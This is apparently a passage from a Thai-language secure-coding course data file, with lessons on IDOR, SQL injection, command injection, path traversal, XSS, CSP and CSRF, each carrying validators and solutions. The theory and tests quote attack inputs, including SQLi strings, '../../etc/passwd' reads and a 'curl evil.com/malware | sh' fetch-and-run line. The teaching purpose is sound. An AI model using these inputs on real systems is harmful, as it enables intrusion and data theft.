    💡 <strong>Mental Model ในการแก้ไข:</strong><br/>
    อย่าดึงข้อมูลด้วย ID จาก URL ตรงๆ เด็ดขาด! การคิวรีข้อมูลต้องตรวจสอบร่วมกับ Identity ของผู้ใช้ที่ล็อกอินอยู่เสมอ:<br/>
    <code>SELECT * FROM accounts WHERE id = :accountId AND owner_id = :authenticatedUserId;</code><br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (PortSwigger BSCP, eJPT & Security+):</strong><br/>
    ข้อสอบเชิงปฏิบัติการของ AppSec (เช่น PortSwigger BSCP) จะมีโจทย์ให้สลับ User GUID หรือแก้พารามิเตอร์ใน Body เพื่อพิสูจน์การ Bypass Authorization เป็นประจำ การเปลี่ยน ID จากตัวเลขเรียงกัน (1, 2, 3) มาเป็น UUID เป็นแค่ <em>Security by Obscurity</em> ถ้าไม่มีการตรวจ Authorization จริง ก็ยังถือว่ามีช่องโหว่ IDOR อยู่ดี`,
    example: `// ยืนยันว่าเข้าถึงข้อมูลของตัวเองได้ปกติ (Positive check)
const ownRes = await request.get('/api/accounts/user-a-111', {
  headers: { Authorization: 'Bearer ' + tokenA }
});
expect(ownRes.status()).toBe(200);`,
    task: `จงเขียน Playwright Test เพื่อจำลองกรณี User A พยายามเข้าถึง resource ของ User B (<code>/api/accounts/user-b-999</code>) และยืนยันว่าระบบต้องตอบ <code>403</code> หรือ <code>404</code>`
  },
  {
    id: "sqli_union_blind",
    meta: "โมดูล 3: OWASP Top 10",
    title: "SQL Injection (SQLi): จาก In-band สู่ Blind SQLi และการป้องกันด้วย Parameterized Queries",
    template: `// สถานการณ์: ปรับปรุงฟังก์ชันค้นหาผู้ใช้ให้ปลอดภัยจาก SQL Injection (OWASP A03:2021)
// การนำ string มาต่อกันตรงๆ เช่น "SELECT * FROM users WHERE username = '" + input + "'"
// ทำให้ผู้โจมตีใส่ payload เช่น "admin' --" หรือ "' UNION SELECT..." เข้ามาทำลายระบบได้
// จงเขียนฟังก์ชัน executeSafeUserQuery(db, username):
// 1. เขียนคำสั่ง SQL ที่ใช้ Parameterized Placeholder (?) แยก Data ออกจาก Code
// 2. เรียกใช้งาน db.query(sql, [username]) และคืนผลลัพธ์ที่ได้
// WRITE YOUR CODE HERE
`,
    validate: async (code, log) => {
      log("🔍 ตรวจสอบการป้องกัน SQL Injection ด้วย Parameterized Queries (Execution Test)...");
      const stripped = stripComments(code);
      const hasConcatenation = /['"`]\s*\+\s*username|\$\{username\}/.test(stripped);
      if (hasConcatenation) {
        throw new Error("ตรวจพบการนำตัวแปร username มาต่อ string โดยตรง ซึ่งเสี่ยงต่อ SQL Injection อย่างร้ายแรง");
      }

      const fn = getLearnerFn(code, 'executeSafeUserQuery');
      let capturedSql = null;
      let capturedParams = null;
      const fakeDb = {
        query: async (sql, params) => {
          capturedSql = sql;
          capturedParams = params;
          return [{ id: 1, username: 'admin' }];
        }
      };

      const attackPayload = "admin' OR '1'='1' --";
      await fn(fakeDb, attackPayload);

      if (!capturedSql || capturedSql.includes(attackPayload)) {
        throw new Error("ช่องโหว่ SQL Injection: ตรวจพบว่าค่า username ถูกนำไปต่อใน SQL String โดยตรงแทนที่จะใช้ Parameter Placeholder (?)");
      }
      if (!capturedSql.includes('?')) {
        throw new Error("คำสั่ง SQL ต้องมีเครื่องหมาย '?' เป็น Parameter Placeholder");
      }
      if (!Array.isArray(capturedParams) || capturedParams[0] !== attackPayload) {
        throw new Error("ค่า input ต้องถูกส่งผ่าน array params ใน db.query(sql, [username])");
      }
      log("✓ ยืนยันได้ว่าคำสั่ง SQL แยกส่วนโค้ดออกจากข้อมูล ป้องกัน SQL Injection ได้ 100%");
    },
    hint: "กำหนด const sql = 'SELECT id, username, email FROM users WHERE username = ?'; แล้ว return await db.query(sql, [username]);",
    solution: `async function executeSafeUserQuery(db, username) {
  const sql = 'SELECT id, username, email FROM users WHERE username = ?';
  return await db.query(sql, [username]);
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจกลไกการโจมตี <strong>SQL Injection (SQLi)</strong> และวิธีแก้ไขมาตรฐานโลกด้วย <strong>Parameterized Queries / Prepared Statements</strong><br/><br/>
    💥 <strong>3 ประเภทหลักของ SQL Injection:</strong><br/>
    1. <strong>In-band SQLi (Classic):</strong> ผู้โจมตีใช้ช่องทางเดียวในการยิงและรับข้อมูล เช่น <code>' UNION SELECT username, password_hash FROM admin_users --</code> ข้อมูลจะโผล่บนหน้าจอทันที<br/>
    2. <strong>Error-based SQLi:</strong> บังคับให้ Database Engine พ่น Syntax Error ที่แอบแนบข้อมูลลับในระบบออกมาทางหน้าจอ<br/>
    3. <strong>Blind SQLi (Inferential):</strong> หน้าจอไม่แสดง error หรือข้อมูลใดๆ แต่แฮกเกอร์สามารถเดาข้อมูลทีละตัวอักษรได้ผ่าน:<br/>
       • <em>Boolean-based:</em> ดูความเปลี่ยนแปลงของ UI เมื่อเงื่อนไขเป็นจริง vs เท็จ<br/>
       • <em>Time-based:</em> สั่งให้ฐานข้อมูลหยุดรอ เช่น <code>pg_sleep(5)</code> หรือ <code>WAITFOR DELAY '0:0:5'</code> ถ้าเว็บโหลดช้าลง 5 วินาทีแปลว่าเงื่อนไขเป็นจริง<br/><br/>
    🛡️ <strong>ทำไม Parameterized Queries ถึงแก้ปัญหาได้เบ็ดเสร็จ:</strong><br/>
    Database Engine จะคอมไพล์โครงสร้างคำสั่ง SQL ล่วงหน้า (Pre-compiled Structure) จากนั้นจึงนำ Input จากผู้ใช้เข้ามาใส่เป็น <strong>"ข้อมูลดิบ (Literal Data)"</strong> ล้วนๆ ไม่ว่า Input จะมีเครื่องหมาย <code>'</code> หรือคำสั่ง <code>DROP TABLE</code> ก็จะไม่มีวันถูกประเมินเป็นคำสั่ง SQL ได้เลย<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & eJPT):</strong><br/>
    ข้อสอบมักหลอกว่า: <em>"การใช้ Stored Procedures เพียงอย่างเดียวป้องกัน SQLi ได้หรือไม่?"</em> ➡️ คำตอบคือ <strong>ไม่ได้</strong> หาก Stored Procedure ภายในยังใช้ String Concatenation อยู่ วิธีที่ถูกต้องเพียงหนึ่งเดียวคือต้องใช้ <strong>Parameterized Inputs</strong> เสมอ`,
    example: `// การเรียกใช้งานที่ปลอดภัย
const result = await executeSafeUserQuery(dbPool, "admin' OR '1'='1");
// Database จะหาผู้ใช้ที่มีชื่อว่า "admin' OR '1'='1" จริงๆ เท่านั้น ไม่มีการบายพาส`,
    task: `จงเขียนฟังก์ชัน <code>executeSafeUserQuery(db, username)</code> โดยใช้คำสั่ง SQL ที่มี Parameterized Placeholder (<code>?</code>) และส่ง <code>[username]</code> แยกต่างหากใน <code>db.query(sql, params)</code>`
  },
  {
    id: "command_injection",
    meta: "โมดูล 3: OWASP Top 10",
    title: "Command Injection & RCE: ควบคุม Server ผ่าน Shell Metacharacters",
    template: `// สถานการณ์: สร้างฟังก์ชัน safeHostPing(host) ที่ป้องกัน Command Injection / RCE
// หากนำ host ไปต่อใน child_process.exec("ping -c 1 " + host) แฮกเกอร์สามารถส่ง
// "8.8.8.8; cat /etc/passwd" หรือ "8.8.8.8 && whoami" เพื่อรันคำสั่งใดๆ บนเครื่องเซิร์ฟเวอร์ได้
// 1. ตรวจสอบ host ด้วย Strict Whitelist Regex: /^[a-zA-Z0-9.-]+$/
//    หากมีอักขระพิเศษ (เช่น ;, |, &, $, space) ให้ throw Error('Invalid host input')
// 2. ใช้ execFile('ping', ['-c', '1', host]) แทนการใช้ exec()
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการป้องกัน Command Injection และการใช้งาน execFile...");
      const stripped = stripComments(code);
      const hasRegexCheck = /^[a-zA-Z0-9.-]+\$/.test(stripped) || /safeHostRegex|test\(host\)/.test(stripped);
      const hasExecFile = /execFile\(\s*['"]ping['"]\s*,\s*\[.*host.*\]/.test(stripped);
      const hasThrow = /throw new Error/.test(stripped);
      if (!hasRegexCheck || !hasThrow) {
        throw new Error("ไม่พบการตรวจสอบ host ด้วย Strict Whitelist Regex หรือการ throw Error เมื่อพบอักขระพิเศษ");
      }
      if (!hasExecFile) {
        throw new Error("ไม่พบการเรียกใช้งาน execFile('ping', ['-c', '1', host]) ซึ่งไม่ผ่าน shell interpreter");
      }
      log("✓ ยืนยันได้ว่าป้องกัน Command Injection ด้วย Whitelist Validation และ Non-shell Execution สำเร็จ");
    },
    hint: "นำเข้า { execFile } from 'node:child_process'; ตรวจสอบ if (!/^[a-zA-Z0-9.-]+$/.test(host)) throw new Error('Invalid host input'); จากนั้นรัน execFile('ping', ['-c', '1', host], callback)",
    solution: `import { execFile } from 'node:child_process';

function safeHostPing(host) {
  const safeHostRegex = /^[a-zA-Z0-9.-]+$/;
  if (!safeHostRegex.test(host)) {
    throw new Error('Invalid host input: Potential command injection detected');
  }
  return new Promise((resolve, reject) => {
    execFile('ping', ['-c', '1', host], (error, stdout) => {
      if (error) reject(error);
      else resolve(stdout);
    });
  });
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจอันตรายของ <strong>Command Injection</strong> ซึ่งนำไปสู่ <strong>Remote Code Execution (RCE)</strong> และการเขียนโค้ดเพื่อปิดช่องโหว่อย่างปลอดภัย<br/><br/>
    💥 <strong>Shell Metacharacters ที่แฮกเกอร์ใช้เจาะ:</strong><br/>
    เมื่อโค้ดส่งคำสั่งผ่าน System Shell (เช่น <code>/bin/sh</code> หรือ <code>cmd.exe</code>) แฮกเกอร์สามารถใช้อักขระพิเศษเพื่อรันคำสั่งที่สองต่อท้ายได้ทันที:<br/>
    • <code>;</code> หรือ <code>\n</code> : รันคำสั่งถัดไปทันที (เช่น <code>ping 127.0.0.1; whoami</code>)<br/>
    • <code>&&</code> : ถ้ารายการแรกสำเร็จ ให้รันรายการสอง (เช่น <code>ping 127.0.0.1 && curl evil.com/malware | sh</code>)<br/>
    • <code>|</code> : ส่ง Output ไปให้คำสั่งถัดไป<br/>
    • <code>&#96;cmd&#96;</code> หรือ <code>$(cmd)</code> : Command Substitution รันคำสั่งด้านในก่อน<br/><br/>
    🛡️ <strong>2 มาตรการป้องกันระดับสถาปัตยกรรม:</strong><br/>
    1. <strong>Avoid the Shell:</strong> ใช้ API ที่เรียก Executable ไบนารีโดยตรงและส่ง Arguments เป็น Array (เช่น <code>execFile</code> ใน Node.js หรือ <code>subprocess.run(shell=False)</code> ใน Python) ระบบปฏิบัติการจะไม่ตีความอักขระพิเศษเป็นคำสั่ง<br/>
    2. <strong>Strict Input Whitelisting:</strong> ตรวจสอบว่า Input ประกอบด้วยตัวอักษรและตัวเลขที่ยอมรับได้เท่านั้น ห้ามใช้ Blacklist เพราะมีวิธี Bypass หลากหลายเสมอ<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & eJPT):</strong><br/>
    ข้อสอบ eJPT และ OSCP มักมีเป้าหมายคือการยกระดับจาก Command Injection ไปเป็น <strong>Reverse Shell</strong> เพื่อควบคุมเครื่องเซิร์ฟเวอร์จากระยะไกล`,
    example: `// การเรียกใช้งาน
await safeHostPing('127.0.0.1'); // ผ่านได้ปกติ
await safeHostPing('127.0.0.1; id'); // Throw Error ทันที`,
    task: `จงเขียนฟังก์ชัน <code>safeHostPing(host)</code> โดยตรวจ validation ด้วย regex <code>/^[a-zA-Z0-9.-]+$/</code> และเรียกใช้งาน <code>execFile('ping', ['-c', '1', host], ...)</code>`
  },
  {
    id: "path_traversal",
    meta: "โมดูล 3: OWASP Top 10",
    title: "Path Traversal: ป้องกันการเจาะอ่าน Arbitrary Files ด้วย Dot-Dot-Slash (../)",
    template: `// สถานการณ์: ป้องกันช่องโหว่ Path Traversal (Directory Traversal)
// แฮกเกอร์ส่ง userInput เป็น '../../../../etc/passwd' เพื่อหลุดออกจากโฟลเดอร์ที่กำหนด
// จงเขียนฟังก์ชัน resolveSafeFilePath(baseDir, userInput):
// 1. นำเข้า path module (import path from 'node:path')
// 2. ใช้ path.resolve เพื่อแปลง baseDir และเส้นทางไฟล์เป็น Absolute Canonical Path
// 3. ตรวจสอบว่า resolvedPath ต้องเริ่มต้นด้วย safeBaseDir เสมอ (.startsWith)
// 4. หากหลุดออกนอกขอบเขต ให้ throw Error('Directory traversal attempt detected')
// 5. หากปลอดภัย ให้คืนค่า resolvedPath
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการป้องกัน Path Traversal ด้วย Path Canonicalization (Attack Simulation)...");
      const stripped = stripComments(code);
      if (!/resolve/.test(stripped) || !/\.startsWith\(/.test(stripped)) {
        throw new Error("ต้องใช้ path.resolve เพื่อทำ Canonicalization และ .startsWith() ตรวจสอบขอบเขต");
      }

      const fn = getLearnerFn(code, 'resolveSafeFilePath');

      // 1. Valid safe file inside baseDir
      const safe = fn('/var/www/uploads', 'avatar.png');
      if (!safe || !safe.includes('avatar.png') || !safe.includes('uploads')) {
        throw new Error("ไม่สามารถเข้าถึงไฟล์ที่ถูกต้องภายใต้ base directory ได้");
      }

      // 2. Traversal attack with ../ escape attempt
      let caughtTraversal = false;
      try {
        fn('/var/www/uploads', '../../../../etc/passwd');
      } catch (e) {
        caughtTraversal = true;
      }
      if (!caughtTraversal) {
        throw new Error("ช่องโหว่ Path Traversal: ฟังก์ชันยอมรับ '../../../../etc/passwd' โดยไม่ throw Error");
      }

      // 3. Traversal attack attempting relative jump
      let caughtRelative = false;
      try {
        fn('/var/www/uploads', '../secret.env');
      } catch (e) {
        caughtRelative = true;
      }
      if (!caughtRelative) {
        throw new Error("ช่องโหว่ Path Traversal: ฟังก์ชันยอมรับ '../secret.env' โดยไม่ throw Error");
      }

      log("✓ ยืนยันได้ว่าป้องกัน Directory Traversal ด้วย Path Canonicalization สำเร็จ");
    },
    hint: "แปลง baseDir เป็น const safeBase = path.resolve(baseDir); และ const resolved = path.resolve(safeBase, userInput); จากนั้น if (!resolved.startsWith(safeBase)) throw new Error(...)",
    solution: `import path from 'node:path';

function resolveSafeFilePath(baseDir, userInput) {
  const safeBase = path.resolve(baseDir);
  const resolvedPath = path.resolve(safeBase, userInput);

  if (!resolvedPath.startsWith(safeBase)) {
    throw new Error('Directory traversal attempt detected');
  }
  return resolvedPath;
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจช่องโหว่ <strong>Path Traversal (Dot-Dot-Slash)</strong> และเทคนิคการป้องกันด้วย <strong>Path Canonicalization</strong><br/><br/>
    💥 <strong>กลไกการโจมตี Path Traversal:</strong><br/>
    เมื่อแอปพลิเคชันอนุญาตให้ดาวน์โหลดไฟล์ผ่าน URL เช่น <code>/download?file=report.pdf</code> หากโค้ดนำชื่อไฟล์ไปต่อกับ path ตรงๆ ผู้โจมตีสามารถส่ง:<br/>
    • <code>../../../../etc/passwd</code> (Linux) เพื่อขโมยรายชื่อผู้ใช้ในระบบ<br/>
    • <code>..\\..\\..\\..\\windows\\win.ini</code> (Windows)<br/>
    • เทคนิค Bypass: URL Encoding <code>%2e%2e%2f</code> หรือ Nested <code>....//</code> (กรณีระบบลบแค่ <code>../</code> รอบเดียว)<br/><br/>
    🛡️ <strong>Path Canonicalization คืออะไร:</strong><br/>
    คือการคลี่คลายสัญลักษณ์ <code>.</code>, <code>..</code>, และ Symbolic Links ทั้งหมดให้กลายเป็น <strong>Absolute Path ที่แท้จริงบนระบบไฟล์</strong> (ผ่าน <code>path.resolve</code>) จากนั้นเพียงแค่ตรวจสอบว่า Path นั้นยังคงอยู่ภายใต้ Base Directory ที่กำหนดหรือไม่<br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (PortSwigger BSCP & eWPT):</strong><br/>
    ในข้อสอบ PortSwigger File Path Traversal มักทดสอบความสามารถในการ Bypass ฟิลเตอร์แบบง่ายๆ การแก้ปัญหาที่ได้คะแนนและปลอดภัยจริงในอุตสาหกรรมคือการทำ Canonicalization เสมอ`,
    example: `// ทดสอบเรียกใช้งาน
resolveSafeFilePath('/var/www/uploads', 'avatar.png'); // ผ่าน: /var/www/uploads/avatar.png
resolveSafeFilePath('/var/www/uploads', '../../etc/shadow'); // Throw Error ทันที!`,
    task: `จงเขียนฟังก์ชัน <code>resolveSafeFilePath(baseDir, userInput)</code> โดยใช้ <code>path.resolve</code> คลี่คลาย path และยืนยันว่าต้องขึ้นต้นด้วย base directory ด้วย <code>.startsWith()</code>`
  },
  {
    id: "xss_stored_reflected_dom",
    meta: "โมดูล 3: OWASP Top 10",
    title: "Cross-Site Scripting (XSS): เจาะลึก Reflected, Stored, DOM-based และ Context Encoding",
    template: `// สถานการณ์: สร้างฟังก์ชัน sanitizeHtmlText(input) เพื่อป้องกันช่องโหว่ Cross-Site Scripting (XSS)
// เมื่อนำข้อความจากผู้ใช้ไปเรนเดอร์ในหน้า HTML ต้องแปลงอักขระพิเศษทั้ง 5 ตัวให้เป็น HTML Entities เสมอ:
// '&' -> '&amp;'
// '<' -> '&lt;'
// '>' -> '&gt;'
// '"' -> '&quot;'
// "'" -> '&#x27;'
// จงเขียนฟังก์ชัน sanitizeHtmlText(input) โดยใช้ .replace() แปลงอักขระดังกล่าวอย่างถูกต้อง
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการทำ HTML Entity Encoding เพื่อป้องกัน XSS...");
      const stripped = stripComments(code);
      const hasAmp = /&amp;/.test(stripped);
      const hasLt = /&lt;/.test(stripped);
      const hasGt = /&gt;/.test(stripped);
      const hasQuot = /&quot;/.test(stripped);
      const hasApos = /&#x27;|&#39;/.test(stripped);
      if (!hasAmp || !hasLt || !hasGt || !hasQuot || !hasApos) {
        throw new Error("ยังแปลงอักขระอันตรายทั้ง 5 ตัว (&, <, >, \", ') เป็น HTML Entities ไม่ครบถ้วน");
      }
      log("✓ ยืนยันได้ว่าฟังก์ชันทำ Sanitization อักขระพิเศษครบถ้วน ป้องกันการรันสคริปต์ XSS");
    },
    hint: "สร้าง map object ของ entity ทั้ง 5 ตัว แล้วใช้ input.replace(/[&<>\"']/g, (char) => entities[char]);",
    solution: `function sanitizeHtmlText(input) {
  const entities = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;'
  };
  return input.replace(/[&<>"']/g, (char) => entities[char]);
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจ 3 รูปแบบของ <strong>Cross-Site Scripting (XSS)</strong> และการทำ <strong>Context-Aware Output Encoding</strong><br/><br/>
    💥 <strong>3 ชนิดของ XSS ที่ต้องแม่นยำ:</strong><br/>
    • <strong>1. Reflected XSS:</strong> สคริปต์มากับคำขอ (เช่น Query string ใน URL <code>?search=&lt;script&gt;...</code>) แล้วเซิร์ฟเวอร์สะท้อนสคริปต์นั้นกลับมาแสดงผลทันที มักใช้หลอกเหยื่อด้วย Phishing Link<br/>
    • <strong>2. Stored XSS (Persistent - อันตรายที่สุด):</strong> สคริปต์ถูกบันทึกลงฐานข้อมูลอย่างถาวร (เช่น ในช่องคอมเมนต์, ประวัติส่วนตัว) ทุกคนที่เปิดหน้านั้นจะถูกรันโค้ดโจมตีโดยอัตโนมัติ<br/>
    • <strong>3. DOM-based XSS:</strong> ช่องโหว่เกิดขึ้นที่โค้ด JavaScript ฝั่ง Client ล้วนๆ เมื่ออ่านข้อมูลจาก <em>Source</em> (เช่น <code>location.search</code>, <code>document.referrer</code>) แล้วส่งต่อไปยัง <em>Sink</em> ที่อันตราย (เช่น <code>element.innerHTML = ...</code> หรือ <code>eval()</code>) โดยข้อมูลไม่เคยวิ่งไปถึงเซิร์ฟเวอร์เลย<br/><br/>
    🛡️ <strong>การป้องกัน:</strong><br/>
    ใช้ <strong>Context-Aware Output Encoding</strong> (แปลงอักขระพิเศษเป็น Entity) ก่อนนำไปแสดงผล และหลีกเลี่ยง API อันตราย เช่น <code>innerHTML</code> หรือใน React คือ <code>dangerouslySetInnerHTML</code><br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & PortSwigger BSCP):</strong><br/>
    ข้อสอบมักถามว่า: <em>"XSS ประเภทใดที่ Web Application Firewall (WAF) บนเซิร์ฟเวอร์ไม่สามารถตรวจจับได้?"</em> ➡️ คำตอบคือ <strong>DOM-based XSS</strong> เพราะการประมวลผลและการรันสคริปต์เกิดขึ้นภายในเว็บเบราว์เซอร์ของเหยื่อเท่านั้น`,
    example: `const safe = sanitizeHtmlText('<script>alert("XSS")</script>');
// safe => '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'`,
    task: `จงเขียนฟังก์ชัน <code>sanitizeHtmlText(input)</code> ให้แปลงอักขระ <code>&</code>, <code><</code>, <code>></code>, <code>"</code>, <code>'</code> เป็น HTML Entities ครบถ้วนทั้ง 5 ตัว`
  },
  {
    id: "content_security_policy",
    meta: "โมดูล 3: OWASP Top 10",
    title: "Content Security Policy (CSP): เสริมเกราะป้องกัน XSS ระดับเบราว์เซอร์",
    template: `// สถานการณ์: ตรวจสอบความเข้มงวดของ Content-Security-Policy (CSP) Header
// CSP เป็นการป้องกันเชิงลึก (Defense-in-Depth) ช่วยป้องกัน XSS แม้จะมีโค้ดหลุดออกไป
// 1. ยิง GET ไปที่หน้าแรก '/'
// 2. อ่าน response.headers()['content-security-policy']
// 3. ยืนยันด้วย expect ว่า header ต้องมีอยู่จริง (toBeDefined)
// 4. ยืนยันว่าต้องไม่มีคำว่า "'unsafe-inline'" และ "'unsafe-eval'"
// 5. ยืนยันว่าต้องมี directive "object-src 'none'" เพื่อปิดการโหลด plugins แปลกปลอม
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบความปลอดภัยและความรัดกุมของ Content-Security-Policy (CSP)...");
      const stripped = stripComments(code);
      const hasGet = /request\.get\(['"`]\/['"`]\)/.test(stripped);
      const hasCspRead = /headers(?:\(\))?\[['"]content-security-policy['"]\]/.test(stripped);
      const hasNoUnsafeInline = /not\.toContain\(['"]'unsafe-inline'['"]\)/.test(stripped);
      const hasNoUnsafeEval = /not\.toContain\(['"]'unsafe-eval'['"]\)/.test(stripped);
      const hasObjectSrcNone = /toContain\(['"]object-src 'none'['"]\)/.test(stripped);
      if (!hasGet || !hasCspRead) {
        throw new Error("ไม่พบการยิง GET หรือการอ่าน header 'content-security-policy'");
      }
      if (!hasNoUnsafeInline || !hasNoUnsafeEval) {
        throw new Error("ไม่พบการตรวจสอบว่า CSP ต้องไม่มี 'unsafe-inline' และ 'unsafe-eval'");
      }
      if (!hasObjectSrcNone) {
        throw new Error("ไม่พบการตรวจสอบ directive object-src 'none'");
      }
      log("✓ ยืนยันได้ว่านโยบาย CSP มีความเข้มงวดสูง ปราศจากค่า unsafe ตามมาตรฐานความปลอดภัย");
    },
    hint: "อ่าน header content-security-policy จาก response.headers() แล้วเขียน expect(csp).not.toContain(\"'unsafe-inline'\"); expect(csp).not.toContain(\"'unsafe-eval'\"); expect(csp).toContain(\"object-src 'none'\");",
    solution: `import { test, expect } from '@playwright/test';

test('CSP header ต้องมีความรัดกุมระดับสูง', async ({ request }) => {
  const response = await request.get('/');
  const csp = response.headers()['content-security-policy'];

  expect(csp).toBeDefined();
  expect(csp).not.toContain("'unsafe-inline'");
  expect(csp).not.toContain("'unsafe-eval'");
  expect(csp).toContain("object-src 'none'");
});`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจการคอนฟิก <strong>Content Security Policy (CSP)</strong> เพื่อเป็นเกราะป้องกัน XSS ระดับเบราว์เซอร์<br/><br/>
    🛡️ <strong>Directives หลักของ CSP:</strong><br/>
    • <code>default-src 'self'</code>: กำหนดแหล่งทรัพยากรเริ่มต้นให้โหลดได้เฉพาะจากโดเมนของตัวเองเท่านั้น<br/>
    • <code>script-src 'self' https://trusted-cdn.com</code>: จำกัดแหล่งที่สคริปต์สามารถดาวน์โหลดมาทำงานได้<br/>
    • <code>object-src 'none'</code>: บล็อกการรันปลั๊กอินรุ่นเก่าอย่าง Flash, Java Applets เพื่อป้องกัน Exploit<br/>
    • <code>frame-ancestors 'none'</code>: สั่งเบราว์เซอร์ห้ามนำเว็บเราไปใส่ใน <code>&lt;iframe&gt;</code> ป้องกัน Clickjacking ยุคใหม่<br/><br/>
    ⚠️ <strong>สองคำต้องห้ามใน CSP ระดับ Production:</strong><br/>
    • <code>'unsafe-inline'</code>: อนุญาตให้รันโค้ดสคริปต์ที่เขียนแทรกในแท็ก HTML (เปิดช่องให้ XSS ทันที!)<br/>
    • <code>'unsafe-eval'</code>: อนุญาตให้ใช้ฟังก์ชัน <code>eval()</code> ซึ่งแปลงสตริงเป็นโค้ด<br/>
    <em>หากจำเป็นต้องใช้ Inline Script ในงานจริง ต้องใช้ Cryptographic Nonce (<code>'nonce-xyz...'</code>) หรือ Hash แทนเสมอ</em><br/><br/>
    🎓 <strong>มุมมองข้อสอบ Cert (CompTIA Security+ SY0-701 & PortSwigger BSCP):</strong><br/>
    ข้อสอบมักถามว่า: <em>"กลไกใดสามารถช่วยจำกัดขอบเขตความเสียหายของ XSS ได้ที่ระดับ Browser Configuration?"</em> ➡️ คำตอบคือ <strong>Content Security Policy (CSP)</strong>`,
    example: `// ตัวอย่าง CSP Header ที่ปลอดภัย
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-R4nd0m'; object-src 'none';`,
    task: `จงเขียน Playwright Test ตรวจสอบ header <code>content-security-policy</code> ของ <code>/</code> ว่าต้องไม่มี <code>'unsafe-inline'</code>, <code>'unsafe-eval'</code> และมี <code>object-src 'none'</code>`
  },
  {
    id: "csrf_token_defense",
    meta: "โมดูล 3: OWASP Top 10",
    title: "CSRF (Cross-Site Request Forgery): Synchronizer Token Pattern และ Double-Submit Cookie",
    template: `// สถานการณ์: สร้างฟังก์ชัน validateCSRFRequest(req) สำหรับป้องกันการโจมตีแบบ CSRF
// การโจมตี CSRF มักกระทำต่อคำขอที่เปลี่ยนสถานะระบบ (POST, PUT, DELETE, PATCH)
// 1. ตรวจสอบ req.method: หากเป็น POST, PUT, DELETE หรือ PATCH
// 2. ดึง clientToken จาก req.headers['x-csrf-token']
// 3. ตรวจสอบว่า clientToken ต้องมีค่าและตรงกับ req.session.csrfToken
// 4. หากไม่มีหรือค่าไม่ตรงกัน ให้ throw Error('Invalid or missing CSRF token: 403 Forbidden')
// 5. หากคำขอเป็น GET หรือผ่านการตรวจ token ให้คืน true
// WRITE YOUR CODE HERE
`,
    validate: (code, log) => {
      log("🔍 ตรวจสอบการทำงานของ Anti-CSRF Synchronizer Token Guard...");
      const stripped = stripComments(code);
      const hasMethodCheck = /POST|PUT|DELETE|PATCH/.test(stripped);
      const hasTokenRead = /headers\[['"]x-csrf-token['"]\]/.test(stripped);
      const hasCompare = /req\.session(\.|\?\.)csrfToken/.test(stripped);
      const hasForbiddenThrow = /throw new Error/.test(stripped) && /CSRF/.test(stripped);
      if (!hasMethodCheck) {
        throw new Error("ไม่พบการตรวจสอบ Method ที่เปลี่ยนสถานะระบบ (POST, PUT, DELETE, PATCH)");
      }
      if (!hasTokenRead) {
        throw new Error("ไม่พบการอ่าน token จาก header 'x-csrf-token'");
      }
      if (!hasCompare) {
        throw new Error("ไม่พบการเปรียบเทียบ token กับ req.session.csrfToken");
      }
      if (!hasForbiddenThrow) {
        throw new Error("ไม่พบการ throw Error เมื่อ token ไม่ถูกต้องหรือไม่มีการส่งมา");
      }
      log("✓ ยืนยันได้ว่าระบบตรวจสอบ Anti-CSRF Token ตามรูปแบบ Synchronizer Token Pattern ถูกต้อง");
    },
    hint: "สร้าง array stateChanging = ['POST', 'PUT', 'DELETE', 'PATCH']; if (stateChanging.includes(req.method.toUpperCase())) { const token = req.headers['x-csrf-token']; if (!token || token !== req.session?.csrfToken) throw new Error(...); } return true;",
    solution: `function validateCSRFRequest(req) {
  const stateChangingMethods = ['POST', 'PUT', 'DELETE', 'PATCH'];
  if (stateChangingMethods.includes(req.method.toUpperCase())) {
    const clientToken = req.headers['x-csrf-token'];
    if (!clientToken || clientToken !== req.session?.csrfToken) {
      throw new Error('Invalid or missing CSRF token: 403 Forbidden');
    }
  }
  return true;
}`,
    theory: `🎯 <strong>เป้าหมาย (Goal):</strong> เข้าใจการทำงานของช่องโหว่ <strong>CSRF (Cross-Site Request Forgery)</strong> และการป้องกันด้วย <strong>Anti-CSRF Synchronizer Token Pattern</strong><br/><br/>
    💥 <strong>กลไกการโจมตี CSRF:</strong><br/>
    1. เหยื่อล็อกอินอยู่ในเว็บไซต์ธนาคาร <code>bank.com</code> และมี Session Cookie ค้างอยู่ในเบราว์เซอร์<br/>
    2. เหยื่อถูกหลอกให้เปิดเว็บอันตราย <code>attacker.com</code> ในอีกแท็บหนึ่ง<br/>
    3. เว็บอันตรายแอบส่ง Form POST ไปที่ <code>bank.com/transfer?to=hacker&amount=10000</code><br/>
    4. เบราว์เซอร์จะแนบคุกกี้ของ <code>bank.com</code> ไปกับคำขอโดยอัตโนมัติ ทำให้ธนาคารเข้าใจว่าเป็นคำสั่งที่เหยื่อตั้งใจทำจริง!<br/><br/>
    🛡️ <strong>Synchronizer Token Pattern แก้ไขอย่างไร:</strong><br/>
    เซิร์ฟเวอร์จะสร้างโทเค็นลับแบบสุ่ม (Anti-CSRF Token) ผูกไว้กับ Session ของผู้ใช้ เมื่อมีคำขอส่งข้อมูล (POST/PUT/DELETE) เซิร์ฟเวอร์จะบังคับให้ต้องแนบโทเค็นนี้มาใน Custom Header (<code>X-CSRF-Token</code>) หรือ Hidden Form Field<br/>
